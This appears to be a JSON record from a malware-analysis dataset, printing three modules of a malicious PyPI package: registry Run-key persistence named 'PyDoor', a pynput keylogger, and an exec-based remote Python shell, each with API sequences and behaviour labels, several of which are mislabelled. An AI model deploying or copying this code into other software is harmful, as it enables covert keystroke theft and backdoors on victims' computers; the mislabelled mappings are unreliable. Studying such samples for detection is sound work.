[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/lalalaopti-1.0.1/lalalaopti-1.0.1/lalalaopti/modules/persistance.py",
    "code_snippet": "import os\nimport sys\nimport platform\nfrom typing import Union\n\nif platform.system() == 'Windows':\n    from winreg import OpenKey, CloseKey, SetValueEx, DeleteValue\n    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ\n    STARTUP_REG_NAME = 'PyDoor'\n\n\ndef add_startup() -> Union[str, None]:\n    \"\"\" Add Client to startup \"\"\"\n    # returns None/error\n    if platform.system() != 'Windows':\n        return 'Startup feature is only for Windows'\n    if getattr(sys, 'frozen', False):\n        path = sys.executable\n    elif __file__:\n        path = os.path.abspath(__file__)\n    try:\n        key = OpenKey(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n            0, KEY_ALL_ACCESS)\n        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)\n        CloseKey(key)\n    except Exception as error:\n        return error\n\n\ndef remove_startup() -> Union[str, None]:\n    \"\"\" Remove Client from Startup \"\"\"\n    # returns None/error\n    if platform.system() != 'Windows':\n        return 'Startup feature is only for Windows'\n    try:\n        key = OpenKey(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n            0, KEY_ALL_ACCESS)\n        DeleteValue(key, STARTUP_REG_NAME)\n        CloseKey(key)\n    except FileNotFoundError:\n        pass\n    except WindowsError as error:\n        return error\n",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "getattr",
        "sys.executable",
        "os.path.abspath",
        "OpenKey",
        "SetValueEx",
        "CloseKey",
        "platform.system",
        "OpenKey",
        "DeleteValue",
        "CloseKey"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "getattr(sys, 'frozen', False)",
        "sys.executable",
        "os.path.abspath(__file__)",
        "OpenKey(HKEY_CURRENT_USER, \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", 0, KEY_ALL_ACCESS)",
        "SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)",
        "CloseKey(key)",
        "platform.system()",
        "OpenKey(HKEY_CURRENT_USER, \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", 0, KEY_ALL_ACCESS)",
        "DeleteValue(key, STARTUP_REG_NAME)",
        "CloseKey(key)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "getattr",
          "id": "get_global_symbols",
          "description": "Retrieves global symbol table as dictionary",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "sys.executable",
          "id": "get_cmd_args",
          "description": "Retrieves command-line arguments passed to script",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.path.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "OpenKey",
          "id": "open_registry_key",
          "description": "Opens registry key with specified access",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "SetValueEx",
          "id": "set_registry_value",
          "description": "Sets value for specified registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_modification"
        },
        {
          "api_name": "CloseKey",
          "id": "close_registry_key",
          "description": "Closes the opened registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "OpenKey",
          "id": "open_registry_key",
          "description": "Opens registry key with specified access",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "DeleteValue",
          "id": "set_registry_value",
          "description": "Sets value for specified registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_modification"
        },
        {
          "api_name": "CloseKey",
          "id": "close_registry_key",
          "description": "Closes the opened registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        }
      ],
      "contextual_code": "def add_startup() -> Union[str, None]:\n    if platform.system() != 'Windows':\n        return 'Startup feature is only for Windows'\n    if getattr(sys, 'frozen', False):\n        path = sys.executable\n    elif __file__:\n        path = os.path.abspath(__file__)\n    try:\n        key = OpenKey(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_ALL_ACCESS)\n        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)\n        CloseKey(key)\n    except Exception as error:\n        return error\n\ndef remove_startup() -> Union[str, None]:\n    if platform.system() != 'Windows':\n        return 'Startup feature is only for Windows'\n    try:\n        key = OpenKey(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_ALL_ACCESS)\n        DeleteValue(key, STARTUP_REG_NAME)\n        CloseKey(key)\n    except FileNotFoundError:\n        pass\n    except WindowsError as error:\n        return error"
    }
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/lalalaopti-1.0.1/lalalaopti-1.0.1/lalalaopti/modules/keylogger.py",
    "code_snippet": "import logging\nimport threading\n\ndef onkeyboardevent(event):\n    \"\"\" On Keyboard Event\"\"\"\n    logging.info(\"%s\", event)\n\nclass Keylogger:\n    \"\"\" Keylogger \"\"\"\n\n    def __init__(self) -> None:\n        \"\"\"\n        Check keylogger state from log\n        then enable or disable it accordingly\n        \"\"\"\n        try:\n            from pynput.keyboard import Listener\n        except ImportError:\n            self.runnable = False\n        else:\n            self.runnable = True\n            self.listener = Listener(on_press=onkeyboardevent)\n\n    def start(self) -> bool:\n        \"\"\" Start keylogger \"\"\"\n        if not self.runnable:\n            logging.error('pynput not found, could not start keylogger')\n            return False\n        if not self.listener.running:\n            self.listener.start()\n            logging.info('Started Keylogger')\n        return True\n\n    def stop(self) -> bool:\n        \"\"\" Attempt to stop the keylogger \"\"\"\n        if not self.runnable:\n            logging.info('pynput not found')\n            return False\n        if self.listener.running:\n            self.listener.stop()\n            logging.info('Stopped Keylogger')\n            threading.Thread.__init__(self.listener)\n        return True\n\n    def state(self) -> bool:\n        \"\"\" Get the state of the keylogger \"\"\"\n        return self.listener.running\n",
    "pattern_analysis": {
      "api_sequence": [
        "logging.info",
        "logging.error",
        "pynput.keyboard.Listener",
        "pynput.keyboard.Listener.start",
        "logging.info",
        "pynput.keyboard.Listener.stop",
        "logging.info",
        "threading.Thread.__init__"
      ],
      "api_sequence_with_args": [
        "logging.info(\"%s\", event)",
        "logging.error('pynput not found, could not start keylogger')",
        "pynput.keyboard.Listener(on_press=onkeyboardevent)",
        "pynput.keyboard.Listener.start()",
        "logging.info('Started Keylogger')",
        "pynput.keyboard.Listener.stop()",
        "logging.info('Stopped Keylogger')",
        "threading.Thread.__init__(self.listener)"
      ],
      "mapped_sequence": [
        {
          "api_name": "logging.info",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "logging.error",
          "id": "log_error",
          "description": "Logs error message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "pynput.keyboard.Listener",
          "id": "remove_keyboard_hooks",
          "description": "Removes all keyboard hooks",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "keyboard_monitoring"
        },
        {
          "api_name": "pynput.keyboard.Listener.start",
          "id": "remove_keyboard_hooks",
          "description": "Removes all keyboard hooks",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "keyboard_monitoring"
        },
        {
          "api_name": "logging.info",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "pynput.keyboard.Listener.stop",
          "id": "remove_keyboard_hooks",
          "description": "Removes all keyboard hooks",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "keyboard_monitoring"
        },
        {
          "api_name": "logging.info",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "threading.Thread.__init__",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        }
      ],
      "contextual_code": "import logging\nimport threading\n\ndef onkeyboardevent(event):\n    logging.info(\"%s\", event)\n\nclass Keylogger:\n    def __init__(self) -> None:\n        try:\n            from pynput.keyboard import Listener\n        except ImportError:\n            self.runnable = False\n        else:\n            self.runnable = True\n            self.listener = Listener(on_press=onkeyboardevent)\n\n    def start(self) -> bool:\n        if not self.runnable:\n            logging.error('pynput not found, could not start keylogger')\n            return False\n        if not self.listener.running:\n            self.listener.start()\n            logging.info('Started Keylogger')\n        return True\n\n    def stop(self) -> bool:\n        if not self.runnable:\n            logging.info('pynput not found')\n            return False\n        if self.listener.running:\n            self.listener.stop()\n            logging.info('Stopped Keylogger')\n            threading.Thread.__init__(self.listener)\n        return True"
    }
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/lalalaopti-1.0.1/lalalaopti-1.0.1/lalalaopti/modules/pyshell.py",
    "code_snippet": "import sys\nfrom io import StringIO\nfrom gogogolokl.utils.errors import errors\n\ndef pyshell(command: str) -> Tuple[str, str]:\n    \"\"\" exec python commands \"\"\"\n    old_stdout = sys.stdout\n    redirected_output = sys.stdout = StringIO()\n    error = None\n    try:\n        exec(command)\n    except Exception as err:\n        error = errors(err, line=False)\n    finally:\n        sys.stdout = old_stdout\n\n    return redirected_output.getvalue(), error",
    "pattern_analysis": {
      "api_sequence": [
        "exec",
        "gogogolokl.utils.errors.errors"
      ],
      "api_sequence_with_args": [
        "exec(command)",
        "gogogolokl.utils.errors.errors(err, line=False)"
      ],
      "mapped_sequence": [
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        },
        {
          "api_name": "gogogolokl.utils.errors.errors",
          "id": "log_error",
          "description": "Logs error message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        }
      ],
      "contextual_code": "from gogogolokl.utils.errors import errors\n\ndef pyshell(command: str) -> Tuple[str, str]:\n    old_stdout = sys.stdout\n    redirected_output = sys.stdout = StringIO()\n    error = None\n    try:\n        exec(command)\n    except Exception as err:\n        error = errors(err, line=False)\n    finally:\n        sys.stdout = old_stdout"
    }
  }
]